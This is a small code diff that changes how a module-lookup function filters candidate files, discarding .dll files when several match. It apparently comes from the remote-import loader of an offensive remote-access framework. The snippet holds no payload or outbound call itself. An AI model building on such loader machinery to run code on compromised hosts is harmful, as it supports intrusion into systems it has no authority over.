@@ -45,7 +45,7 @@ def get_module_files(fullname):
     global modules
     path = fullname.replace('.','/')
 
-    return [
+    files = [
         module for module in modules.iterkeys() \
         if module.rsplit(".",1)[0] == path or any([
             path+'/__init__'+ext == module for ext in [
@@ -53,6 +53,12 @@ def get_module_files(fullname):
             ]
         ])
     ]
+
+    if len(files) > 1:
+        # If we have more than one file, than throw away dlls
+        files = [ x for x in files if not x.endswith('.dll') ]
+
+    return files
 
 def pupy_add_package(pkdic):
     """ update the modules dictionary to allow remote imports of new packages """
